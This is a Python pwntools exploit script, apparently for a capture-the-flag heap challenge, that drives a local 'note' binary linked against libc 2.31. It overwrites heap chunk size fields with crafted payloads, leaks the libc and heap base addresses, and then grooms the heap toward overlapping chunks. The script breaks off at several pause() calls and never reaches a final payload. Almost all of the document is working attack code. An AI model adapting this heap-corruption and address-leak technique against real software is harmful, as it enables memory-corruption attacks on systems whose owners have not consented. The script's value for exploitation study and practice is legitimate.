from pwn import *

io = process('./note')
libc = ELF('./libc-2.31.so')

def add(size):
    print(io.recvuntil('>> '))
    io.sendline('1')
    print(io.recv())
    io.sendline(str(size))
def delete():
    print(io.recvuntil('>> '))
    io.sendline('4')
def view():
    print(io.recvuntil('>> '))
    io.sendline('2')
def edit(data):
    print(io.recvuntil('>> '))
    io.sendline('3')
    print(io.recv())
    io.sendline(data)



add(127)
payload = b'\0'*212+p64(0x21)+p64(0xffffffffffffffff)
edit(payload)
add(127)
#payload = b'\0'*244+p64(0x501)+p32(0x500)
#edit(payload)
delete()
add(110)
add(110)
add(110)
add(90)
add(0)
add(127)
payload = b'\0'*244+p64(0x501)+p32(0x500)
edit(payload)
delete()
add(32)
view()
print(io.recvuntil('<------------ NOTE 1 ------------>\n'))
io.recv(4)
libc.address = u64(io.recv(8)) - 0x1ec010
heapbase = u64(io.recv(8)) - 0x3c0
print(hex(libc.address))
print(hex(heapbase))
add(0x390)
add(0xa0)
print('DONE!')
add(0x80)


'''
for i in range(7):
    add(0x7f)
    add(0x80)
    payload = b'\0'*236+p64(0)+p64(0x1f1)
    edit(payload)
    delete()

for i in range(6):
    add(0x7f)
    add(0x80)
    payload = b'\0'*236+p64(0)+p64(0x1e1)
    edit(payload)
    delete()

add(0x7f)
add(0x130)
payload = b'\0'*236+p64(0)+p64(0x1e1)
edit(payload)
delete()

add(0x230)
payload = b'\0'*20+p64(0x2a1)
edit(payload)
add(0x80)
delete()
add(0x7f)
add(0x80)
payload = b'\0'*236+p64(0x480)+p64(0x90)
edit(payload)
delete()
'''


for i in range(7):
    add(0x7f)
    add(0x80)
    delete()
    add(0x140)
    add(0x80)
    payload = b'\0'*236+p64(0)+p64(0x261)
    edit(payload)
    delete()


for i in range(6):
    add(0x7f)
    add(0x80)
    delete()
    add(0x100)
    add(0x80)
    payload = b'\0'*236+p64(0)+p64(0x221)
    edit(payload)
    delete()


add(0x7f)
add(0x80)
delete()
add(0x100)
add(0x80)
payload = b'\0'*236+p64(0)+p64(0x221)
edit(payload)
delete()

add(0x200) # chunk B
add(0x200) # chunk C
delete()
add(0x7f)
#payload = b'\0'*4+b'\0'*0x30+p64(0x4f)
payload = b'\0'*(236-40)+p64(0x4f)
edit(payload)
add(0x200)
payload = b'\0'*236+p64(0x4b0)+p64(0x260)
edit(payload)
pause()
delete()


add(0x148)
pause()

delete()
pause()
add(0xa0)
add(0x80)
delete()
add(0x7f)
add(0x80)
payload = b'\0'*236+p64(0x150)+p64(0x90)
edit(payload)
delete()
pause()
add(0xa0)
